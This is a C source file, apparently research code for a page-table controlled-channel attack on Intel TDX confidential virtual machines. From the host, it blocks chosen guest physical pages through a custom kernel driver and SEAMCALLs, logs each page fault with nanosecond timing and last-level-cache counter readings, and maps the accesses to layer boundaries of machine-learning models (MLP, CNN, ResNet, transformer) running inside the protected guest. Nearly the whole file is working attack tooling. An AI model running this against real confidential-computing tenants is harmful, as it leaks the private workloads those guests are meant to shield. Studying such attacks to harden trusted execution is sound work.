// 1-page-table-attack-timing.c

#include <linux/perf_event.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <poll.h>
#include "../tdxutils/tdxutils.h"
#include <time.h>
#include <stdint.h>
#include <string.h>

#define CRESET "\033[39m"
#define CGRN "\033[92m"
#define CCYN "\033[96m"

#define PROBE_SIZE (32 * 1024 * 1024)
#define CACHE_LINE 64
#define PROBE_REPEATS 5

static unsigned char *probe_buf;

static int expected_end_idx = -1;
static int counter_active = 0;
static int llc_refs_fd = -1;
static int llc_misses_fd = -1;

static long perf_event_open_counter(struct perf_event_attr *hw_event, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

static int open_llc_counter(uint64_t op, uint64_t result) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(struct perf_event_attr));

    pe.type = PERF_TYPE_HW_CACHE;
    pe.size = sizeof(struct perf_event_attr);

    pe.config =
        PERF_COUNT_HW_CACHE_LL |
        (op << 8) |
        (result << 16);

    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 0;

    int fd = perf_event_open_counter(&pe, -1, 2, -1, 0);
    if (fd == -1) {
        perror("perf_event_open");
        return -1;
    }

    return fd;
}

static void init_perf_counters(void) {
    llc_refs_fd = open_llc_counter(
        PERF_COUNT_HW_CACHE_OP_READ,
        PERF_COUNT_HW_CACHE_RESULT_ACCESS
    );

    llc_misses_fd = open_llc_counter(
        PERF_COUNT_HW_CACHE_OP_READ,
        PERF_COUNT_HW_CACHE_RESULT_MISS
    );

    if (llc_refs_fd == -1 || llc_misses_fd == -1) {
        fprintf(stderr, "Could not open LLC hardware counters\n");
        exit(EXIT_FAILURE);
    }
}


static void reset_start_counters(void) {
    ioctl(llc_refs_fd, PERF_EVENT_IOC_DISABLE, 0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_DISABLE, 0);

    ioctl(llc_refs_fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_RESET, 0);

    ioctl(llc_refs_fd, PERF_EVENT_IOC_ENABLE, 0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_ENABLE, 0);

    counter_active = 1;
}

static void stop_read_counters(uint64_t *llc_refs, uint64_t *llc_misses) {
    ssize_t ret;

    ioctl(llc_refs_fd, PERF_EVENT_IOC_DISABLE, 0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_DISABLE, 0);

    ret = read(llc_refs_fd, llc_refs, sizeof(uint64_t));
    if (ret != sizeof(uint64_t))
        perror("read llc_refs");

    ret = read(llc_misses_fd, llc_misses, sizeof(uint64_t));
    if (ret != sizeof(uint64_t))
        perror("read llc_misses");
}

static unsigned long long now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
    return ((unsigned long long) ts.tv_sec * 1000000000ULL) + ts.tv_nsec;
}

static inline uint64_t rdtsc(void) {
    unsigned int lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

static inline void mfence_all(void) {
    asm volatile("mfence" ::: "memory");
}

static inline void clflush_line(void *p) {
    asm volatile("clflush (%0)" :: "r"(p));
}

static void init_probe_buffer(void) {
    probe_buf = aligned_alloc(CACHE_LINE, PROBE_SIZE);
    if (!probe_buf) {
        perror("aligned_alloc");
        exit(EXIT_FAILURE);
    }

    memset(probe_buf, 1, PROBE_SIZE);
}

static void flush_probe_buffer(void) {
    for (size_t i = 0; i < PROBE_SIZE; i += CACHE_LINE) {
        clflush_line(&probe_buf[i]);
    }
    mfence_all();
}

static void prime_llc_probe(void) {
    volatile unsigned long sum = 0;

    for (size_t i = 0; i < PROBE_SIZE; i += CACHE_LINE) {
        sum += probe_buf[i];
    }

    mfence_all();
}

static uint64_t measure_probe_latency(void) {
    volatile unsigned long sum = 0;
    uint64_t start, end;

    mfence_all();
    start = rdtsc();

    for (int r = 0; r < PROBE_REPEATS; r++) {
        for (size_t i = 0; i < PROBE_SIZE; i += CACHE_LINE) {
            sum += probe_buf[i];
        }
    }

    mfence_all();
    end = rdtsc();

    return end - start;
}

static unsigned char get_gpa_level(int util_fd, unsigned long gpa, unsigned long tdr_pa) {
    union tdx_sept_entry entry;
    unsigned long rc;

    rc = seamcall_tdh_mem_sept_rd(util_fd, 1, gpa & ~((1ul << 21) - 1), tdr_pa, (void*) &entry, NULL);
    if (rc != TDX_SUCCESS) {
        fprintf(stderr, "Error - Could not resolve this GPA! Make sure it is valid.\n");
        exit(EXIT_FAILURE);
    }

    return entry.leaf ? 1 : 0;
}

static int block_single_gpa(int util_fd, unsigned long gpa, unsigned long tdr_pa) {
    unsigned char level = get_gpa_level(util_fd, gpa, tdr_pa);
    struct tdx_gpa_range range = {
        .start = level_align(gpa, level),
        .end = level_align(gpa, level) + level_pg_size(level),
        .tdr_pa = tdr_pa,
        .level = level,
    };

    return ioctl(util_fd, IOCTL_TDX_BLOCK_GPA_RANGE, &range);
}

static int same_2mb_page(unsigned long a, unsigned long b) {
    return (a & ~((1ul << 21) - 1)) == (b & ~((1ul << 21) - 1));
}


static const char *marker_name(const char *model, int idx) {
    if (strcmp(model, "mlp") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "L1_START";
            case 2: return "L1_END";
            case 3: return "L2_START";
            case 4: return "L2_END";
            case 5: return "L3_START";
            case 6: return "L3_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }

    if (strcmp(model, "cnn") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "CONV_START";
            case 2: return "CONV_END";
            case 3: return "POOL_START";
            case 4: return "POOL_END";
            case 5: return "FC1_START";
            case 6: return "FC1_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }

    if (strcmp(model, "resnet") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "BLOCK1_START";
            case 2: return "BLOCK1_END";
            case 3: return "BLOCK2_START";
            case 4: return "BLOCK2_END";
            case 5: return "CLASSIFIER_START";
            case 6: return "CLASSIFIER_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }

    if (strcmp(model, "transformer") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "QKV_START";
            case 2: return "QKV_END";
            case 3: return "ATTENTION_START";
            case 4: return "ATTENTION_END";
            case 5: return "FFN_START";
            case 6: return "FFN_END";
            case 7: return "CLASSIFIER_START";
            case 8: return "CLASSIFIER_END";
            case 9: return "TERM";
            default: return "UNKNOWN";
        }
    }

    return "UNKNOWN";
}

static int find_marker(unsigned long accessed, unsigned long *gpa, int num_gpas) {
    for (int i = 0; i < num_gpas; i++) {
        if (same_2mb_page(accessed, gpa[i]))
            return i;
    }
    return -1;
}

static int is_start_marker(int idx) {
    return idx == 1 || idx == 3 || idx == 5 || idx == 7;
}

static int is_end_marker(int idx) {
    return idx == 2 || idx == 4 || idx == 6 || idx == 8;
}

static int matching_end_marker(int start_idx) {
    if (start_idx == 1) return 2;
    if (start_idx == 3) return 4;
    if (start_idx == 5) return 6;
    if (start_idx == 7) return 8;
    return -1;
}

int main(int argc, char* argv[]) {
    struct pollfd pfd;
    unsigned long access_counter = 0, address_accessed = 0;
    unsigned long long start_ns = 0, last_ns = 0, current_ns = 0;
    unsigned long tdr_pa;
    int util_fd, status;


if (argc < 3) {
    fprintf(stderr, "Usage: %s <model> <GPA1> <GPA2> <GPA3> ...\n", argv[0]);
    fprintf(stderr, "Models: mlp, cnn, resnet, transformer\n");
    exit(EXIT_SUCCESS);
}

const char *model = argv[1];

int num_gpas = argc - 2;
    unsigned long *gpa = malloc(num_gpas * sizeof(unsigned long));
    if (!gpa) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < num_gpas; i++) {
        char *endptr = NULL;
        gpa[i] = strtoul(argv[i + 2], &endptr, 0);
        if (*endptr != '\0') {
            fprintf(stderr, "Could not parse GPA '%s'\n", argv[i + 2]);     
            free(gpa);
            exit(EXIT_FAILURE);
        }
    }

    init_probe_buffer();

    init_perf_counters();

    util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
    if (util_fd < 0) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    tdr_pa = get_tdr_pa(util_fd);

    while (read(util_fd, &address_accessed, sizeof(address_accessed)) > 0) {}

    for (int i = 0; i < num_gpas; i++) {
        if (block_single_gpa(util_fd, gpa[i], tdr_pa) < 0) {
            perror("ioctl");
            fprintf(stderr, "Could not block GPA 0x%lx!\n", gpa[i]);
            free(gpa);
            exit(EXIT_FAILURE);
        }

        printf("Blocked the " CCYN "%s" CRESET " page corresponding to GPA " CCYN "0x%lx" CRESET "\n",
            get_gpa_level(util_fd, gpa[i], tdr_pa) ? "2MB" : "4kB", gpa[i]);
    }

    start_ns = now_ns();
    last_ns = start_ns;

    printf("\n" CGRN "%-8s %-16s %-16s %-14s %-18s %-16s %-16s" CRESET "\n",
        "count",
        "time_ns",
        "delta_ns",
        "gpa",
        "marker",
        "llc_refs",
        "llc_misses");

    pfd = (struct pollfd) { .fd = util_fd, .events = POLLIN };

    do {
        status = poll(&pfd, 1, 250);
        if (status <= 0)
            continue;

        status = read(util_fd, &address_accessed, sizeof(address_accessed));
        if (status <= 0)
            continue;

        current_ns = now_ns();

        int idx = find_marker(address_accessed, gpa, num_gpas);
        const char *name = marker_name(model, idx);

        uint64_t llc_refs = 0;
        uint64_t llc_misses = 0;


        if (is_start_marker(idx)) {
            reset_start_counters();
            expected_end_idx = matching_end_marker(idx);
        }

       if (is_end_marker(idx) && counter_active) {
           stop_read_counters(&llc_refs, &llc_misses);
           counter_active = 0;
           expected_end_idx = -1;
       }


        printf(CGRN "%-8lu %-16llu %-16llu 0x%012lx %-18s %-16lu %-16lu" CRESET "\n",
            access_counter,
            current_ns - start_ns,
            current_ns - last_ns,
            address_accessed,
            name,
            llc_refs,
            llc_misses);

        last_ns = current_ns;

        if (block_single_gpa(util_fd, address_accessed, tdr_pa) < 0)
            break;

        access_counter++;

    } while (status >= 0);

    printf("\nStopping here\n");

    if (status < 0) {
        perror("poll/ioctl");
        exit(EXIT_FAILURE);
    }

    return 0;
}
